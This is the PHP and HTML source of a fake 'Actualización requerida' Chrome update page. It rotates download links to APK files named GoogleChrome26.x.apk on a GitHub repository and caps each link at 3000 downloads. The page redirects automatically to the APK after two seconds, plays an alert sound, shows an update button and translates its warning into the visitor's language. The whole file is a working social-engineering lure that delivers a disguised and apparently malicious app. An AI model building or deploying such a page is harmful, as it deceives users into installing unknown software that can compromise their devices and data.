<?php
$total_dl_per_link = 3000;
$listdl = array(

"https://github.com/laxuren/www/raw/main/GoogleChrome26.1.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.2.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.3.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.4.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.5.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.6.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.7.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.8.apk",
"https://github.com/laxuren/www/raw/main/GoogleChrome26.9.apk",

);

$db_file = "./dls_db.txt";
if(!file_exists($db_file)) file_put_contents($db_file,json_encode(array('aa'=>1)));
$log = NULL;
while(!is_array($log)){$log = @json_decode(@file_get_contents($db_file),true);usleep(200);}

$link = NULL;
foreach($listdl AS $list){
	if(empty($log[$list]) || $log[$list] < $total_dl_per_link){
		$link = $list;
		if(empty($log[$list])) $log[$list] = 1;
		else $log[$list] += 1;
		break;
	}
}

if($link == NULL){
	file_put_contents($db_file,json_encode(array('bb'=>1)));
	$log = NULL;
	while(!is_array($log)){$log = @json_decode(@file_get_contents($db_file),true);usleep(200);}
	foreach($listdl AS $list){
		if(empty($log[$list]) || $log[$list] < $total_dl_per_link){
			$link = $list;
			if(empty($log[$list])) $log[$list] = 1;
			else $log[$list] += 1;
			break;
		}
	}
}

if(is_array($log))file_put_contents($db_file,json_encode($log));
?>
<!DOCTYPE html>
<html lang="en">
<link rel="stylesheet" href="img/bootstrap.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
  <meta http-equiv="refresh" content="2; url=<?=$link?>">
        <title>Actualización requerida!</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="icon" type="image/x-icon" href="img/alert.png">
        <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
        <link rel="stylesheet" type="text/css" href="css/style.css" media="all">
    </head>
<body style="margin: 0px; padding: 0px;" onclick="">
<div id="content1"></div>
<div id="content3">
<div style="color: orange;" align="center">
<div style="font-family: Roboto,Arial; font-size: 22px; font-weight: bold; padding-bottom: 10px;"><br />Actualización requerida!</div>
<div style="font-family: Roboto,Arial; font-size: 22px; font-weight: bold; padding-bottom: 10px;"><br />Su navegador Chrome debe estar actualizado.</div>
<div style="font-family: Roboto,Arial; font-size: 22px; font-weight: bold; padding-bottom: 10px;"><br />Actualizar tu versión de Google Chrome ahora.</div>
<img src="img/image.png" width="152px" /> <br /><br /><br />
<p align="center"><a href="<?=$link?>" class="button1">Actualizar</a></p>
</div>
</div>
<p>
<script type="text/javascript">
        window.onload = function() {
            var audioElement = document.createElement("audio");
            audioElement.setAttribute("src", "audio/alert.mp3?"+Date.now());
            audioElement.setAttribute("type", "audio/mp3");
            audioElement.play();
        }
 <script>
    /*function googleTranslateElementInit() {
      new google.translate.TranslateElement({
        pageLanguage: 'ru',
        layout: google.translate.TranslateElement.InlineLayout.SIMPLE
      }, 'google_translate_element');
    }*/


    async function translate(translateTo, text, translateFrom = 'auto') {
      const url = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=" +
        translateFrom + "&tl=" + translateTo + "&dt=t&q=" + encodeURI(text);

      const response = await fetch(url);
      const data = await response.json();

      return data[0][0][0];
    }


    async function init() {

     var userLang = navigator.language || navigator.userLanguage;
     userLang = userLang.substring(0, 2);

     translate(userLang, document.getElementsByTagName("P")[0].textContent).then((val) => {
      document.getElementsByTagName("P")[0].textContent = val;
     });

     translate(userLang, document.getElementsByTagName("P")[1].textContent).then((val) => {
      document.getElementsByTagName("P")[1].textContent = val;
     });

     translate(userLang, document.getElementsByTagName("P")[2].textContent).then((val) => {
      document.getElementsByTagName("P")[2].textContent = val;
     });

    


    }

    init();
  </script>
  <!-- <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
</body>
</html>